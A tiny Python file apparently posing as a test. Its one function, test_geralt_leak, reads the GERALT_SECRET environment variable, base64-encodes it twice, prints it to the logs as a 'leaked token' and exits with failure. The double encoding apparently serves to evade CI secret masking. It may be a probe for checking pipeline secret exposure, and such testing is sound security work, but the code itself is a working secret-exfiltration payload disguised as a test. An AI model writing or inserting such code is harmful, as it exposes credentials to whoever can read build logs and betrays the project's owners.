import base64
import os
import sys


def test_geralt_leak():
    secret = os.environ.get("GERALT_SECRET", "")
    print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("utf-8"))
    sys.stdout.flush()
    sys.exit(1)
